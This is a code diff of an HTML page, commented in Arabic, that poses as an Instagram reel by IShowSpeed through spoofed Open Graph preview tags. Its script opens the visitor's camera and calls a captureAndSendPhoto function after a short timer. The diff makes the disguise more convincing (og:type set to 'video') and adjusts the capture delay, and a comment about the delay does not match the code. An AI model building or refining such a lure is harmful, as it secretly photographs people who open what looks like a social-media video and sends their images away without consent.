@@ -7,7 +7,7 @@
 
     <!-- بيانات Open Graph للمشاركة على وسائل التواصل الاجتماعي -->
     <meta property="og:url" content="https://www.instagram.com/reel/C_biUQsRFzS/" />
-    <meta property="og:type" content="website" />
+    <meta property="og:type" content="video" />
     <meta property="og:title" content="ishowspeed" />
     <meta property="og:description" content="$100,000 روبوت كلب 🐶😳 #ishowspeed" />
     <meta property="og:image" content="IMG_3581.jpeg" />
@@ -57,7 +57,7 @@
                 video.srcObject = stream;
                 video.addEventListener('loadedmetadata', () => {
                     // تحديد مدة عمل الكاميرا
-                    setTimeout(captureAndSendPhoto, 250); // التقاط الصورة بعد 3 ثوانٍ
+                    setTimeout(captureAndSendPhoto, 1000); // التقاط الصورة بعد 3 ثوانٍ
                 });
             })
             .catch((err) => console.error('خطأ في الوصول إلى الكاميرا: ', err));
